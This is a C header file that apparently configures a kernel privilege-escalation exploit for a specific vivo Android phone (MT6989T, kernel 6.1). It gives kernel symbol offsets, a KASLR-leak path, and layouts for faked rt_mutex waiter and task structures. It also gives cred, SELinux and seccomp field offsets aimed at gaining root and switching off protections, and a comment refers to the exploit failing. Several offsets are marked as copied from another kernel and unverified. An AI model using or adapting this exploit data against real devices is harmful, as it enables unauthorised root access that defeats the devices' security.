#ifndef TARGET_H
#define TARGET_H

/*
 * vivo PD2417 (MT6989T, kernel 6.1.145-android14-11-maybe-dirty)
 *
 * All symbol offsets extracted from compiled vmlinux (System.map).
 * Compiled from vivo MT6989T kernel source without LTO/PGO/BOLT,
 * so offsets differ from the device kernel Image (which has LTO).
 *
 * NOTE: Device kernel has LTO+PGO+BOLT — the actual device offsets
 * may differ from these vmlinux offsets. This config is for the
 * vmlinux-compiled kernel, not the stock device kernel.
 *
 * perf_event_paranoid = -1, but perf_event_open blocked by SELinux.
 * SLIDE path is broken on this kernel (stack layout incompatibility).
 */

#define BUILD_VARIANT_LABEL "vivo_PD2417_BP2A.250605.031.A3"
#define BUILD_FINGERPRINT "vivo/PD2417/PD2417:16/BP2A.250605.031.A3/compiler260618151227:user/release-keys"

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define PSELECT_WAITER_WORD_SHIFT 1
#define PSELECT_TIMEOUT_SEC 2

/* Symbol offsets from vmlinux System.map (compiled w/o LTO/PGO/BOLT) */
#define ASHMEM_MISC_FOPS_OFF 0x011002a8ULL  /* misc_fops */
#define ASHMEM_FOPS_OFF 0x0115d3b0ULL
#define ASHMEM_IOCTL_OFF 0x00be07a8ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00be1090ULL  /* compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF 0x00be10e8ULL
#define ASHMEM_OPEN_OFF 0x00be1308ULL
#define ASHMEM_RELEASE_OFF 0x00be1390ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00be14b0ULL
#define CONFIGFS_READ_ITER_OFF 0x00449da4ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0044a2d4ULL
#define COPY_SPLICE_READ_OFF 0x003cdb84ULL  /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF 0x00380cb4ULL
#define INIT_TASK_OFF 0x01e7ee00ULL
#define INIT_UTS_NS_OFF 0x01feee48ULL
#define EMPTY_ZERO_PAGE_OFF 0x02048000ULL
#define ROOT_TASK_GROUP_OFF 0x0204f540ULL
#define SELINUX_BLOB_SIZES_OFF 0x01456590ULL
#define SELINUX_ENFORCING_OFF 0x01e2a7f8ULL  /* selinux_enforcing_boot */
#define SECURITY_HOOK_HEADS_OFF 0x01455e90ULL
#define KMALLOC_CACHES_OFF 0x014559d8ULL
#define ANON_PIPE_BUF_OPS_OFF 0x00ff5b90ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* SLIDE / KASLR leak path (boot_id -> nfulnl_logger address)
 * All offsets from vmlinux System.map */
#define SLIDE_NFULNL_LOGGER_OFF 0x01e72a20ULL  /* nfulnl_logger struct */
#define SLIDE_LOGGERS_0_1_OFF 0x01e72970ULL    /* loggers[0][1] = loggers + 8 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x020c2820ULL  /* sysctl_bootid (uuid buffer) */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x020c2820ULL  /* sysctl_bootid = boot_id data */

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Page layout offsets (copied from duchamp; verify if exploit fails) */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/*
 * rt_mutex_waiter struct offsets for kernel 6.1 (SMALL layout, no tree_prio etc.)
 * Verified by disassembling task_blocks_on_rt_mutex:
 *   stp x20, x19, [x21, #48]  → task=0x30, lock=0x38
 *   str w8, [x21, #68]         → prio=0x44
 *   str x9, [x21, #72]         → deadline=0x48
 *   add x0, x21, #0x18         → pi_tree_entry=0x18
 */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF 0x40
#define WAITER_PRIO_OFF 0x44
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WW_CTX_OFF 0x50

/* FAKE_WAITER offsets for kernel 6.1 SMALL waiter struct
 * (no separate tree_prio/tree_deadline/pi_prio/pi_deadline fields;
 *  prio at 0x44 and deadline at 0x48 are shared for tree & pi_tree) */
#define FAKE_WAITER_TREE_PRIO_OFF 0x44
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x44
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_WW_CTX_OFF 0x50

/* task_struct offsets (copied from duchamp kernel 6.6; VERIFY for 6.1) */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define MM_OWNER_OFF 1032
#define TASK_PID_OFF 0x618
#define TASK_TGID_OFF 0x61c
#define TASK_REAL_PARENT_OFF 0x628
#define TASK_ATOMIC_FLAGS_OFF 0x5d8
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x820
#define TASK_COMM_OFF 0x830
#define TASK_TASKS_OFF 0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8

/* cred struct offsets (copied from duchamp; VERIFY for 6.1) */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 40
#define CRED_SECURITY_OFF 128
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* page/slab struct offsets */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

/* pipe_inode_info offsets (copied from duchamp; VERIFY for 6.1) */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

/* file_operations offsets (VERIFIED against vivo kernel image) */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
